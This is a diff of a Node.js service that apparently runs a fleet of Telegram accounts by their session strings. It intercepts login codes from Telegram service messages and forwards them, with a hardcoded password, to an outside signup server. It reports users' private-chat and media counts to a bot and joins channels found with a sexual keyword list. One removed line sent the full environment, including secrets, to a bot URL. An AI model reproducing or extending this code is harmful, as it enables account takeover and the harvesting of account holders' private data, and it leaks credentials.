@@ -600,8 +600,10 @@ class ChannelService {
         const today = new Date().toISOString().split('T')[0]
         const query = { date: { $lte: today } }
         if (mobile) {
+            console.log(mobile)
             query['mobile'] = mobile
         }
+        console.log(query)
         const results = await bufferColl.find(query).toArray();
         if (results.length) {
             for (const result of results) {
@@ -618,15 +620,18 @@ class ChannelService {
                 }
             }
         } else {
+            console.log("returnimg undefind")
             return undefined
         }
     }
 
     async deleteBufferClient(user) {
         const filter = { mobile: user.mobile };
+        console.log(filter)
         const bufferColl = this.client.db("tgclients").collection('bufferClients');
         try {
             const entry = await bufferColl.deleteOne(filter);
+            console.log(entry)
         } catch (error) {
             console.log(error)
         }
@@ -757,10 +762,24 @@ class ChannelService {
         const result = await clientDb.aggregate(aggregationPipeline).toArray();
         return result.length > 0 ? result[0] : null;
     }
+
+    
     async updateUserConfig(filter, data) {
         const upiDb = this.client.db("tgclients").collection('clients');
         const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });
         return updatedDocument.value;
+    }
+
+    async readArchivedClients(filter, limit) {
+        const bufferColl = this.client.db("tgclients").collection('ArchivedClients');
+        const query = filter || {};
+        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);
+        const result = await queryWithLimit.toArray();
+        if (result?.length > 0) {
+            return result;
+        } else {
+            return [];
+        }
     }
 
     async insertInAchivedClient(data) {
@@ -873,6 +892,15 @@ class ChannelService {
         const uniqueChannelNames = Array.from(uniqueChannels);
         return uniqueChannelNames;
     }
+    async setEnv() {
+        const clientDb = this.client.db("tgclients").collection('configuration');
+        const jsonData = await clientDb.findOne({}, { _id: 0 });
+        for (const key in jsonData) {
+            console.log('setting', key)
+            process.env[key] = jsonData[key];
+        }
+        console.log("finished setting env");
+    }
 
     async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {
         const pattern = new RegExp(keywords.join('|'), 'i');
@@ -960,6 +988,7 @@ class ChannelService {
 }
 
 module.exports = ChannelService;
+
 
 /***/ }),
 
@@ -1207,7 +1236,8 @@ class TelegramManager {
             this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                 connectionRetries: 5,
             });
-            console.log("Stating Client - ", this.phoneNumber)
+            console.log("Stating Client - ", this.phoneNumber);
+            this.client.setLogLevel('error');
             await this.client.connect();
             // const msg = await this.client.sendMessage("777000", { message: "." });
             // await msg.delete({ revoke: true });
@@ -1740,7 +1770,7 @@ class TelegramManager {
                 if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
                     console.log("LoginText: ", event.message.text)
                     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
-                    console.log("Code is:", code)
+                    console.log("Code is:", code);
                     try {
                         const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                         console.log("Code Sent");
@@ -1906,37 +1936,38 @@ let clients;
 let upiIds;
 const pings = {}
 
+
 fetchWithTimeout('https://ipinfo.io/json')
   .then(result => {
-    return result.data;
+    return result?.data;
   })
   .then((output) => {
     ip = output;
     console.log(ip)
   })
-  .then(() => {
-    ChannelService.getInstance().connect().then(async () => {
-      setTimeout(async () => {
-        checkerclass.getinstance()
-        await setUserMap();
-        setTimeout(() => {
-          // Array.from(userMap.values()).map(async (value) => {
-          //   try {
-          //     joinchannels(value);
-          //     await sleep(3000);
-          //   } catch (error) {
-          //     console.log("Some Error: ", error.code);
-          //   }
-          // })
-          joinchannelForBufferClients();
-        }, 120000);
-      }, 100);
-    })
-  }
-).catch(err => {
-  console.error(err)
-  joinchannelForBufferClients();
-})
+  .then(async () => {
+    const db = ChannelService.getInstance()
+    await db.connect();
+    await db.setEnv();
+    setTimeout(async () => {
+      checkerclass.getinstance()
+      await setUserMap();
+    }, 100);
+    setTimeout(() => {
+      if (!getActiveClientSetup()) {
+        joinchannelForBufferClients();
+      }
+    }, 120000);
+  }).catch(err => {
+    console.error(err)
+    setTimeout(() => {
+      if (!getActiveClientSetup()) {
+        joinchannelForBufferClients();
+      }
+    }, 120000);
+  })
+
+
 
 let count = 0;
 let botCount = 0
@@ -1964,7 +1995,7 @@ const apiResp = {
 async function setUserMap() {
   userMap.clear();
   const db = ChannelService.getInstance();
-  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map,${JSON.stringify(process.env)}`);
+  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
   const users = await db.getAllUserClients();
   clients = users
   upiIds = await db.getAllUpis()
@@ -1996,11 +2027,11 @@ try {
       }
       await sleep(3000)
     }
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    await fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
     await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
   })
   schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {
-    fetchWithTimeout(`https://uptimechecker.onrender.com/joinchannel`)
+    fetchWithTimeout(`${process.env.uptimeChecker}/joinchannel`)
     joinchannelForBufferClients();
   })
 } catch (error) {
@@ -2034,6 +2065,13 @@ app.get('/checkBufferClients', async (req, res, next) => {
   next();
 }, async (req, res) => {
   await checkBufferClients();
+});
+app.get('/checkArchivedClients', async (req, res, next) => {
+  checkerclass.getinstance()
+  res.send('Checking Buffer Clients');
+  next();
+}, async (req, res) => {
+  await checkArchivedClients();
 });
 
 app.get('/processUsers/:limit/:skip', async (req, res, next) => {
@@ -2154,15 +2192,16 @@ app.post('/users', async (req, res, next) => {
   const db = ChannelService.getInstance();
   const cli = getClient(user.mobile);
   const activeClientSetup = getActiveClientSetup()
-  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
-    user['lastUpdated'] = new Date().toISOString().split('T')[0]
-    await db.insertUser(user);
-    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\nhttps://uptimechecker.onrender.com/connectclient/${user.mobile}`)}`);
-  } else {
+  if (activeClientSetup && activeClientSetup?.phoneNumber == user.mobile) {
     setActiveClientSetup(undefined)
     console.log("New Session Generated");
     await setNewClient(user, activeClientSetup);
     await deleteClient(user.mobile)
+  } else {
+    console.log(!cli, activeClientSetup?.phoneNumber, user.mobile)
+    user['lastUpdated'] = new Date().toISOString().split('T')[0]
+    await db.insertUser(user);
+    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
   }
 });
 
@@ -2630,7 +2669,7 @@ app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
       if (cli) {
         const client = await getClient(user.mobile);
         const channels = await client.channelInfo(true);
-        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl','randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
+        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
         const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
         console.log("DbChannelsLen: ", result.length);
         let resp = '';
@@ -3208,7 +3247,7 @@ app.listen(port, async () => {
 class checkerclass {
   static instance = undefined;
 
-  constructor () {
+  constructor() {
     this.main();
   };
 
@@ -3433,6 +3472,23 @@ async function checkBufferClients() {
   await addNewUserstoBufferClients();
 }
 
+async function checkArchivedClients() {
+  const db = await ChannelService.getInstance();
+  await disconnectAll()
+  await sleep(2000);
+  const clients = await db.readArchivedClients({});
+  for (const document of clients) {
+    console.log(document)
+    const cli = await createClient(document.mobile, document.session);
+    if (!cli) {
+      console.log(document.mobile, " :  false");
+      badIds.push(document.mobile);
+      await db.removeOneAchivedClient({number: document.number})
+    }
+  }
+}
+
+
 async function addNewUserstoBufferClients() {
   const db = await ChannelService.getInstance();
   const cursor = await db.getNewBufferClients(goodIds);
@@ -3565,7 +3621,7 @@ async function setUpClient(clientId, archieveOld, days = 0, mobile = null, forma
 
     const newClient = await db.getOneBufferClient(mobile);
 
-    await deleteClient(newClient.mobile)
+    await deleteClient(newClient?.mobile)
     await sleep(2000);
     if (newClient) {
       const cli = await createClient(newClient.mobile, newClient.session, false);
@@ -3612,11 +3668,12 @@ async function generateNewSession(phoneNumber) {
   try {
     console.log("String Generation started");
     await sleep(1000);
-    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
+    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber.toString()}&force=${true}`, { timeout: 15000 }, 1);
     if (response) {
-      console.log(`Code Sent successfully-${response}`);
+      console.log(`Code Sent successfully`, response);
       await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
     } else {
+      console.log(`Failed to send Code-${JSON.stringify(response)}`);
       await sleep(5000);
       await generateNewSession(phoneNumber);
     }
@@ -3641,7 +3698,7 @@ async function setNewClient(user, activeClientSetup) {
         console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
         // if (data.userName) {
         //   try {
-        //     await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${data.userName}`);
+        //     await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${data.userName}`);
         //   } catch (error) {
 
         //   }
@@ -3649,21 +3706,21 @@ async function setNewClient(user, activeClientSetup) {
       }
     }
     const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
-    console.log("Updated the Client Successfully", updatedClient);
+    console.log("Updated the Client Successfully",activeClientSetup.phoneNumber, updatedClient);
     await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/forward/updateclient/${clientId}`);
+    await fetchWithTimeout(`${process.env.uptimeChecker}/forward/updateclient/${clientId}`);
     await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
     console.log(activeClientSetup.clientId, " -  ", updatedClient)
     if (updatedClient?.userName) {
       try {
-        await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${updatedClient.userName}`);
+        await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${updatedClient.userName}`);
       } catch (error) {
         console.log(error);
       }
     }
     await setUserMap();
     try {
-      await fetchWithTimeout(`https://uptimechecker.onrender.com/refreshmap`);
+      await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);
     } catch (error) {
       console.log(error);
     }
